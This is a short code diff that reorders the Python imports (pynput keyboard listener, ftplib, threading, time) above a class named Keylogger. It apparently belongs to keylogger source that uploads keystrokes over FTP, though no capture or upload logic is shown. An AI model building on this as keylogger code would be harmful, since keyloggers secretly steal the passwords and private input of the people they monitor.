@@ -1,9 +1,8 @@
-import pynput.keyboard
-import threading
-from time import gmtime, strftime
-import ftplib
 import io
-
+import ftplib
+import threading
+import pynput.keyboard
+from time import gmtime, strftime
 
 
 class Keylogger:
